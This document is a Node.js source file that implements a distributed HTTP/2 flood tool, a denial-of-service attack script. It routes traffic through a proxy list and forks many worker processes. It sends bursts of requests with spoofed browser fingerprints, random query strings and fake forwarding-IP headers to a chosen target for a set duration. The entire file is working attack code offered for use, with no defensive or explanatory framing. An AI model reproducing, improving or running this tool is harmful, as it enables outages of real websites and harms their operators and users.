const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]) * 4,
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'ecdsa_secp384r1_sha384'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json',
    'text/html',
    'application/xml'
];

const lang_header = [
    'en-US',
    'zh-CN',
    'fr-FR',
    'ja-JP',
    'de-DE',
    'es-ES'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip',
    'br'
];

const version = [
    '"Google Chrome";v="117", "Chromium";v="117", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="118", "Google Chrome";v="118"',
    '"Microsoft Edge";v="117", "Chrome";v="117", "Microsoft Edge";v="117"'
];

const rateHeaders = [
    { "x-forwarded-for": randstr(12) },
    { "x-real-ip": randstr(12) },
    { "via": randstr(12) }
];

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m' + args.Rate + '\x1b[0m');
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setTimeout(() => process.exit(0), args.time * 1000);
    setInterval(runFlooder, 100);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error}`);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(15) + "=" + randstr(10);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = randomElement(version);
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = randomElement(encoding_header);
headers["accept-language"] = randomElement(lang_header);
headers["accept"] = randomElement(accept_header);
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";

function runFlooder() {
    const proxyAddr = randomElement(readLines(args.proxyFile));
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            connection?.destroy();
            return;
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'P-256:P-384',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            socket: connection,
            sigals: randomElement(sig)
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 30000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 50);
            client.on("close", () => clearInterval(IntervalAttack));
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection?.destroy();
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection?.destroy();
        });
    });
}
